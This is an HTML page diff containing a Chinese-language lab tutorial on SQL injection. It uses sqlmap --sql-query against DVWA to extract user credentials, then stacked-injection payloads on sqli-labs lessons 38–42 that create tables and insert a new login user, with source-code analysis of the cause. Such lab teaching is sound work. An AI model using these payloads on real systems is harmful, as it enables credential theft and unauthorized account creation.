@@ -13,6 +13,11 @@
     
 
     
+        <meta name="description" content="了解Sqlmap
+sqlmap是一款开源、功能强大的自动化SQL注入工具，支持Access，MySQL，Oracle，SQL Server，DB2等多种数据库。支持get，post，cookie注入，支持基于布尔的盲注，基于时间的盲注，错误回显注入，联合查询注入，堆查询注入等。
+实验步骤一
+利用sq"/>
+    
 
     <!--Author-->
     
@@ -25,6 +30,11 @@
     
 
     <!--Open Graph Description-->
+    
+        <meta property="og:description" content="了解Sqlmap
+sqlmap是一款开源、功能强大的自动化SQL注入工具，支持Access，MySQL，Oracle，SQL Server，DB2等多种数据库。支持get，post，cookie注入，支持基于布尔的盲注，基于时间的盲注，错误回显注入，联合查询注入，堆查询注入等。
+实验步骤一
+利用sq"/>
     
 
     <!--Open Graph Site Name-->
@@ -191,7 +201,123 @@
 
             <!-- Post Main Content -->
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                
+                <p>了解Sqlmap</p>
+<p>sqlmap是一款开源、功能强大的自动化SQL注入工具，支持Access，MySQL，Oracle，SQL Server，DB2等多种数据库。支持get，post，cookie注入，支持基于布尔的盲注，基于时间的盲注，错误回显注入，联合查询注入，堆查询注入等。</p>
+<p><strong>实验步骤一</strong></p>
+<p>利用sqlmap选项–sql-query辅助手工注入</p>
+<p>1.打开<a href="http://10.1.1.136，输入用户名：admin">http://10.1.1.136，输入用户名：admin</a> 密码：password，登录</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=bb6c6621-09e7-4dd1-ac3e-6457a320a5a7.png"></p>
+<p>2.找到并打开SQL Injection，随便提交一个数，打开burpsuite抓包，然后点击submit，获取cookie</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=1955da84-7faa-4f90-bbc3-fabc0590c3f0.png"></p>
+<p>3.使用内置函数获取用户名，版本，数据库名等信息</p>
+<p>输入：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –</p>
+<p>cookie=”PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low” –sql-query “select user(),version(),database()” </p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=c417f8c3-cc42-4be3-b637-702bbbb04af3.png"></p>
+<p><strong>实验步骤二</strong></p>
+<p>4.得到数据库名为dvwa，接下来猜表</p>
+<p>输入：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –</p>
+<p>cookie=”PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low” –sql-query “(select count(*) from dvwa.users)&gt;0”</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=dabc309f-2d49-4ee0-b80d-bc36c67add15.png"></p>
+<p>5.返回1，说明存在users表，然后开始猜列</p>
+<p>输入：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –</p>
+<p>cookie=”PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low” –sql-query “(select count(username) from dvwa.users)&gt;=0”</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=2f1ad397-fd8d-47e2-8cf4-59e6d6124cd3.png"></p>
+<p>6..没有返回，说明不存在username列，将username改为user，返回1。</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=a1272451-9a68-45bf-87f1-1a472ef19354.png"></p>
+<p>输入：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –</p>
+<p>cookie=”PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low” –sql-query “(select count(password) from dvwa.users)&gt;=0”</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=7c2b19ab-fb7e-4b29-a9d9-08e6b5c024e5.png"></p>
+<p>7.得到了列名，现在我们来猜内容</p>
+<p>输入：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –</p>
+<p>cookie=”PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low” –sql-query “select user,password from dvwa.users”</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=57d533d2-94d0-498c-a839-874cc1dba0d4.png"></p>
+<p>8.借助sqlmap选项–sql-query结合手工注入语句就得到了user表中的用户信息。</p>
+<p>堆叠注入</p>
+<p>1）概念<br>      Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，在mysql中，主要是命令行中，每一条语句结尾加分号;来表示语句结束。这样我们就想到了是不是可以多句一起使用。这个就叫做stacked injection。</p>
+<p>2）堆叠注入使用条件<br>      堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行。</p>
+<p>关于SQL基础语句<br>      增：insert into tableName(columnName1,columnName2) values(value1,value2)</p>
+<pre><code>  删：delete from tableName where …
+
+  改：update tableName set columnName=value where …
+
+  查：select * from tableName where …
+</code></pre>
+<p><strong>实验步骤一</strong></p>
+<p>我们的任务分为2个部分：</p>
+<p>首先先根据报错或注入测试分析出SQL语句中如何闭合参数，同时我们构造语句闭合前面的参数进行堆叠注入。</p>
+<ol>
+<li>任务一中是基于GET型的堆叠注入。</li>
+<li>任务二中是基于POST型的堆叠注入。</li>
+</ol>
+<p>任务描述： 基于GET型的堆叠注入。</p>
+<ol>
+<li>  启动phpstudy，打开<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a> 点击page-3 stacked injections，打开less-38 GET-Stacked Query injection-string。</li>
+<li>  页面提示我们将id作为参数，我们加入参数后，在值后面加入特殊字符，比如单引号，来测试是否具有sql漏洞，且测试参数为字符型还是数字型：localhost/sqli-labs-master/Less-38/?id=1’</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=1d512109-a200-416f-8bd6-6e22725681c1.png"></p>
+<p> 看到蓝色标记处，提示我们多了一个单引号，故可知该参数闭合为单引号闭合。</p>
+<ol start="3">
+<li>  我们尝试在当前查询后面加入分号，构造下一条sql语句。比如此处我们创建一个新的数据表，表中有一个列为id：localhost/sqli-labs-master/Less-38/?id=1’;create table less38(id int(3))%23</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=0af3ce57-c819-4d83-b68f-b8e543fd62cd.png"></p>
+<ol start="4">
+<li><p>我们来到后台phpstudy中的mysql命令行，来验证是否sql语句执行成功。</p>
+<p>  mysql&gt;show databases;</p>
+<p>  mysql&gt;use security</p>
+<p>  mysql&gt;show tables;</p>
+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=338e737a-16ab-434c-a2c9-bde7c1d45ea5.png"></p>
+<pre><code> 可以看到语句成功执行，创建了less38的数据表。
+</code></pre>
+<ol start="5">
+<li>  我们可以做的操作就不止于此，通过一些其他方式，实验者可以自由发挥，可手工注入，可工具注入，得知查询sql语句所在的数据库为security，数据表为users，列名分别为id、username、password，如此，我们可以试着添加一个新的用户进去。localhost/sqli-labs-master/Less-38/?id=1’; insert into users values (‘100’,’less38’,’heetian’)%23</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=5bb32837-366b-46b8-a6fe-5063a70af731.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=f88469ec-2864-48e9-8a0d-93ba3519ae46.png"></p>
+<ol start="6">
+<li> Less-39、less-40实验步骤和less-38是一样的，通过插入特殊字符报错发现只是参数闭合不一样。实验者自行实验。less-41中错误不回显，这时我们可以通过构造sql语句的真假，而页面返回不一样来判断出了参数为整型，那我们在语句后加上分号，之后和less-38一样，如图：localhost/sqli-labs-master/Less-41/?id=1;insert into users values(‘101’,’less41’,’heetian’)–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=d3377dcc-d7de-4cf9-aa1e-8140806fb07a.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=d1620d83-9116-42f4-a69e-e888977d871a.png"></p>
+<ol start="7">
+<li> 切换到less-41的后台源代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=cd9e1f6e-b4b4-4d5b-ac56-3e8055f7b168.png"></p>
+<p>可以看到在46行源代码中传入参数没有做任何防护，且在48行查询时使用mysqli_multi_query函数进行sql查询。我们直接输入特殊字符分号，加上我们需要执行的sql语句，后台数据库直接代入sql语句执行。</p>
+<p><strong>实验步骤二</strong></p>
+<p>任务描述：基于POST型的堆叠注入。</p>
+<ol>
+<li> 打开lesson-42，可以看到界面和之前不一样，任务一中我们直接在url上构建sql注入语句，属于get型，less-42是在表单中提交我们构造的sql语句，属于post型。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=be0a55f6-4ec9-4c66-a7fb-4a4c375614b8.png"></p>
+<ol start="2">
+<li>  我们尝试使用弱口令进行注入，发现密码处能进行注入。我们猜测后台sql查询语句为select * from users where username=’$username’ and password=’$password’，其中username可能做了过滤，而password处没有做过滤，那我们尝试在password处进行堆叠注入。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=b44980ce-45a2-4b82-a232-2f7503136b43.png"></p>
+<ol start="3">
+<li>  我们在密码处直接用分号结束上一条sql语句，接着创建less42这个数据表。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=665b9dd4-eb67-46eb-a5e6-95b5d5cf1a74.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=af439646-361e-4bc8-ae0b-eec12c1e21e6.png"></p>
+<p>我们看到后台数据库中已经创建该数据表。</p>
+<ol start="4">
+<li>  同样在密码处我们尝试进行其他操作。比如增加一个用户到users表中。username随便输入，password密码处直接输入’;insert into users values(‘110’,’less42’,’heetian’)#</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=51f199e9-6852-47e3-b699-dadf8060fd24.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=6e3f3c5d-1f74-4885-8832-d89ef5312faf.png"></p>
+<p>后台数据库中已经插入，我们尝试使用自己添加的用户名密码登陆。</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=f23922ab-06c1-47d2-bca8-b54cc5e16dae.png"></p>
+<p>  可以看到已经登陆成功。</p>
+<ol start="5">
+<li>  我们切换到后台源代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=64c65b3a-ddac-43f2-aa6e-1e184676a72f.png"></p>
+<p> 在21、22行可以看到和我们猜测的一样，在username参数传入后使用mysql_real_escape_string做了一次过滤。而在password中直接传入后没有做任何过滤，直接代入了sql查询语句。同样在34行进行查询时使用了mysqli_multi_query函数进行查询，导致堆叠注入可能实现。</p>
+<ol start="6">
+<li>  less43、less44、less45和less42原理一样，望实验者自行实验。</li>
+</ol>
+
 
                 
             </div>
